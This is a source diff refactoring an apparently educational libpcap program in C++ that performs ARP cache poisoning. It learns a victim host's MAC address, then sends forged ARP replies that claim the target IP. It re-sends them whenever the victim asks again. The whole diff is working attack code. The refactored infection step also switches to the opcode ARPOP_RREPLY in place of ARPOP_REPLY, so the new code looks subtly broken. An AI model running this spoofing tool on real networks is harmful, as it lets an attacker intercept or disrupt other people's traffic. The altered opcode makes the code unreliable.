@@ -63,21 +63,19 @@ bool get_my_ip (char * dev,in_addr *a_ip) {
     return true;
 }
 
-struct _type_eth_arp make_broadcast_packet(uint8_t *s_mac,in_addr s_ip,in_addr t_ip){
-    type_eth_arp tmp;
-    memcpy(tmp.src_mac,s_mac,MAC_LEN);
-    memset(tmp.dst_mac,0xff,MAC_LEN);
-    tmp.type = htons(ETHERTYPE_ARP);
-    tmp.hw_type = htons(ARPHRD_ETHER);
-    tmp.proto_type = htons(ETHERTYPE_IP);
-    tmp.hw_len = MAC_LEN;
-    tmp.proto_len = IP_LEN;
-    tmp.op_code = htons(ARPOP_REQUEST);
-    memcpy(tmp.s_mac,s_mac,MAC_LEN);
-    tmp.s_ip = s_ip;
-    memset(tmp.t_mac,0x00,MAC_LEN);
-    tmp.t_ip = t_ip;
-    return tmp;
+void set_broadcast_packet(type_eth_arp *tmp, uint8_t *s_mac,in_addr s_ip,in_addr t_ip){
+    memcpy(tmp->src_mac,s_mac,MAC_LEN);
+    memset(tmp->dst_mac,0xff,MAC_LEN);
+    tmp->type = htons(ETHERTYPE_ARP);
+    tmp->hw_type = htons(ARPHRD_ETHER);
+    tmp->proto_type = htons(ETHERTYPE_IP);
+    tmp->hw_len = MAC_LEN;
+    tmp->proto_len = IP_LEN;
+    tmp->op_code = htons(ARPOP_REQUEST);
+    memcpy(tmp->s_mac,s_mac,MAC_LEN);
+    tmp->s_ip = s_ip;
+    memset(tmp->t_mac,0x00,MAC_LEN);
+    tmp->t_ip = t_ip;
 }
 
 void time_error(int signo){
@@ -85,7 +83,7 @@ void time_error(int signo){
     exit(1);
 }
 
-void make_infection_packet(pcap_t * handle, type_eth_arp *tmp, in_addr fake_ip){
+void set_target_mac(pcap_t * handle, type_eth_arp *tmp){
     struct sigaction act;
     act.sa_handler = time_error;
     sigemptyset(&act.sa_mask);
@@ -107,13 +105,16 @@ void make_infection_packet(pcap_t * handle, type_eth_arp *tmp, in_addr fake_ip){
             continue;
         if ((earp->s_ip.s_addr == tmp->t_ip.s_addr) && (earp->t_ip.s_addr == tmp->s_ip.s_addr) && (ntohs(earp->op_code) == ARPOP_REPLY)){
             memcpy(tmp->dst_mac,earp->s_mac,MAC_LEN);
-            tmp->s_ip = fake_ip;
             memcpy(tmp->t_mac,earp->s_mac,MAC_LEN);
-            tmp->op_code = htons(ARPOP_REPLY);
             alarm(0);
             break;
         }
     }
+}
+
+void set_infection_packet(type_eth_arp *tmp, in_addr fake_ip){
+    tmp->s_ip = fake_ip;
+    tmp->op_code = htons(ARPOP_RREPLY);
 }
 
 void usage() {
@@ -137,6 +138,7 @@ int main(int argc, char* argv[]) {
     in_addr my_ip, sender_ip, target_ip;
     inet_aton(argv[2],&sender_ip);
     inet_aton(argv[3],&target_ip);
+    type_eth_arp sender_packet;
     if (get_my_mac(dev, my_mac) == false){
         printf("error : mac_address can't be imported\n");
         return -1;
@@ -146,11 +148,12 @@ int main(int argc, char* argv[]) {
         return  -1;
     }
     
-    type_eth_arp s_b = make_broadcast_packet(my_mac,my_ip,sender_ip);
-    make_infection_packet(handle,&s_b,target_ip);
+    set_broadcast_packet(&sender_packet,my_mac,my_ip,sender_ip);
+    set_target_mac(handle,&sender_packet);
+    set_infection_packet(&sender_packet,target_ip);
     printf("Send arp packet!\n");
-    pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&s_b), sizeof (type_eth_arp));
-    pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&s_b), sizeof (type_eth_arp));
+    pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&sender_packet), sizeof (type_eth_arp));
+    pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&sender_packet), sizeof (type_eth_arp));
     
     while (true) {
         struct pcap_pkthdr* header;
@@ -164,9 +167,9 @@ int main(int argc, char* argv[]) {
         type_eth_arp *earp = reinterpret_cast<type_eth_arp *>(const_cast<u_char *>(packet));
         if(ntohs(earp->type) != ETHERTYPE_ARP)
             continue;
-        if((earp->s_ip.s_addr == s_b.t_ip.s_addr) && (earp->t_ip.s_addr == s_b.s_ip.s_addr) && (ntohs(earp->op_code) == ARPOP_REQUEST)){
+        if((earp->s_ip.s_addr == sender_packet.t_ip.s_addr) && (earp->t_ip.s_addr == sender_packet.s_ip.s_addr) && (ntohs(earp->op_code) == ARPOP_REQUEST)){
             printf("send reply packet\n");
-            pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&s_b), sizeof (type_eth_arp));
+            pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&sender_packet), sizeof (type_eth_arp));
         }
     }
     pcap_close(handle);
